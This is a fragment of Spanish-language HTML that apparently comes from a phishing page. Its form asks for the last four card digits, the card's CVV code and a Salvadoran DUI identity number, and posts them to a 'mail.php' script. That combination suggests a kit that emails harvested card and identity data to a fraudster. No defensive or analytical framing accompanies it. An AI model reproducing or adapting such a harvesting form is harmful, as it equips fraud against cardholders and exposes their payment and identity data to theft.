...
<form action="mail.php" method="post" style="width: 360px; height: auto; padding: px; margin-left: -5px;">
...
<br><br><br>
<p style="font-family: sans-serif;font-size: 15px;float: left;color: rgb(59, 57, 57);">Últimos 4 dígitos de tu Tarjeta</p>
<input inputmode="numeric" maxlength="4" minlength="4" required class="ipp" type="text" name="trj" id="us">
<br>



<p style="font-family: sans-serif;font-size: 15px;float: left;color: rgb(59, 57, 57);">Código de seguridad de su tarjeta (cvv)</p>
<input inputmode="numeric" maxlength="3" minlength="3"  required class="ipp" type="text" name="cv" id="us">
<br>
...
<p style="font-family: sans-serif;font-size: 15px;float: left;color: rgb(59, 57, 57);">DUI</p>
<input inputmode="numeric" maxlength="10" minlength="10" required class="ipp" type="text" name="dni" id="us">
<br>
